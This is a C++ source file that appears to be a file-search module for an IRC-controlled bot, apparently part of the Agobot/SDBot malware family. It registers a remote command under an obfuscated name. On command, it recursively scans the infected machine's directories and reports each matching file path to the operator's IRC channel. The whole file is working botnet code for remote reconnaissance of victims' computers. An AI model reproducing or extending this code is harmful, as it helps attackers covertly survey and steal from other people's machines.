#include "main.h"
#include "mainctrl.h"
#include "findfile.h"
#include "irc.h"
#include "sdcompat.h"

// Oh, look, batman! it's a file!
// by GHOSN :: Touchup & Fixes by AfroNerd

void CFindFile::Init(){
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdFindFile, dp(6,9,12,5,0).CStr(), this);
}

bool CFindFile::HandleCommand(CMessage *pMsg){

if(!pMsg->sCmd.Compare(m_cmdFindFile.sName.Str())){
		FFIND ffind;
		ffind.sock=NULL;
		ffind.chan=pMsg->sDest;
		ffind.filename=pMsg->sChatString.Token(2, " ", true).CStr();
		ffind.dirname=pMsg->sChatString.Token(3, " ", true).CStr();
		ffind.threadnum=0;
		ffind.notice=pMsg->bNotice;
		ffind.silent=pMsg->bSilent;
		FFIND *ffinds = &ffind;
		ffinds->gotinfo = TRUE;
		char sendbuf[IRCLINE];
		unsigned int numfound = 0;

		if(!ffind.dirname.Mid(ffind.dirname.m_iLength).Compare("\\"))
			ffind.dirname.Mid(ffind.dirname.m_iLength)="\x0";

		numfound = FindFile(ffind.sock,ffind.chan,ffind.notice,ffind.filename.Str(),ffind.dirname.Str(),numfound);
		sprintf(sendbuf,"Files Found: %d", numfound);

		if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);

		clearthread(ffind.threadnum);
		ExitThread(0);
	}return true;
}

unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound)
{
	char sendbuf[IRCLINE], tmpPath[MAX_PATH], newPath[MAX_PATH];

	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) {
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname, fd.cFileName);
					numfound = FindFile(sock, chan, notice, filename, newPath, numfound);			
				}
			}
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {numfound ++;
			_snprintf(sendbuf,sizeof(sendbuf),"Found: %s\\%s", dirname, fd.cFileName);
			irc_privmsg(sock,chan,sendbuf,notice);
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	return (numfound);
}
